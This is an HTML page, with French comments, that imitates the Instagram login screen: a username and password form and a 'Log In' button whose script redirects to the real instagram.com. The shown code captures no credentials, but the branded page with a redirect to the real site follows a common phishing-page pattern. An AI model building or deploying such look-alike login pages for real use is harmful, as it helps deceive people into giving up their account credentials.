<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>Instagram</h1>
            <form>
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <!-- Bouton de connexion -->
                <button onclick="redirectToNewSite()">Log In</button>
                <div class="divider">
                    <span>OR</span>
                </div>
                <!-- Bouton de connexion avec Facebook -->
                <button type="button" class="facebook-login">Log in with Facebook</button>
                <!-- Lien pour rÃ©initialiser le mot de passe -->
                <a href="#" class="forgot-password">Forgot password?</a>
            </form>
            <!-- Lien pour s'inscrire -->
            <div class="signup">
                <span>Don't have an account? <a href="#">Sign up</a></span>
            </div>
        </div>
        <div class="app-links">
        </div>
    </div>
    <!-- Script pour la redirection -->
    <script>
        function redirectToNewSite() {
            window.location.href = "https://www.instagram.com";
        }
    </script>
</body>
</html>
